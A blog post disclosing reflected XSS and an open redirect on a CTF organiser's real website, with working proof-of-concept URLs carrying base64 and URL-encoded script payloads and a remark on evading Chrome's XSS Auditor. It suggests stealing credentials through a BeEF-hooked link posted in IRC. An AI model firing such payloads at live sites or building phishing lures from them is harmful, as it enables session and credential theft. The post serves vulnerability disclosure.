---
layout: post
title: Break-in CTF multiple XSS and an open redirect
---

Played a really silly CTF recently and found a bunch of bugs right off the bat. Wrote an email to the organizers with that but received no reply whatsoever. The event is over so here are some of those. Needless to say, all of these could be used to steal creds/flags e.g. by dropping a link to their IRC channel with a BEEF hook: "Hey, is this a flag?!"

### XSS

There are XSS found at the following URLs:

- \[1\] http://felicity.iiit.ac.in/threads/forgot_password/?errors=
- \[2\] http://felicity.iiit.ac.in/threads/change_password/?errors=
- \[3\] http://felicity.iiit.ac.in/threads/logout.php?destination=

In case with \[1\] and \[2\], the `error` parameter takes on a base64-encoded value. The server-side handler embeds base64-decoded arbitrary parameter values into the page it sends out to be rendered.

### PoC

(will run `<script>alert(/pwned/)</script>`, feel free to click through):


    [1] http://felicity.iiit.ac.in/threads/forgot_password/?errors=PHNjcmlwdD5hbGVydCgvcHduZC8pPC9zY3JpcHQ+

    [2] http://felicity.iiit.ac.in/threads/change_passwd/?errors=PHNjcmlwdD5hbGVydCgvcHduZC8pPC9zY3JpcHQ+


In case with \[3\], the `destination` parameter is not filtered out correctly (if at all) and leads to XSS after some fuzzing. In the PoC below, some extra fuzzing is done, however it's possible to get around filtering with much less effort. The example below will render `http://%0 d%0 a` in the page body but will run `<script>alert(/pwned/)</script>`:


    [3] http://felicity.iiit.ac.in/threads/logout.php?destination=%3Chtml%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/html%3Ehttp://%0%0dd%0%0aa

**Note**: Google Chrome is smart enough to understand that there's a security issue and tries to hinder the XSS attempt:
<br>

    The XSS Auditor refused to execute a script in 'http://felicity.iiit.ac.in/threads/logout.php?destination=%3Chtml%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/html%3Ehttp://%0%0dd%0%0aa' because its source code was found within the request. The auditor was enabled as the server sent neither an 'X-XSS-Protection' nor 'Content-Security-Policy' header. logout.php:1

(However, I was still able to bypass even that after some obfuscation. Other browsers are much more prone to the issue.)


### Open redirect


    [1] http://felicity.iiit.ac.in/threads/logout.php?destination=http://google.com


actually goes to `http://google.com` if you're nice and to `3v1lspl017z.hk.ch/funny_cats.html` if not so. The `destination` parameter will send the "Location" header with the contents of `http://google.com` or any other (possibly malicious) URL.

P.S. There were other issues, like SQLi, but that seems to affect not only the CTF event website, so abstaining from that for now :/

> Read the manual if unsure, post comment(s) if unclear.
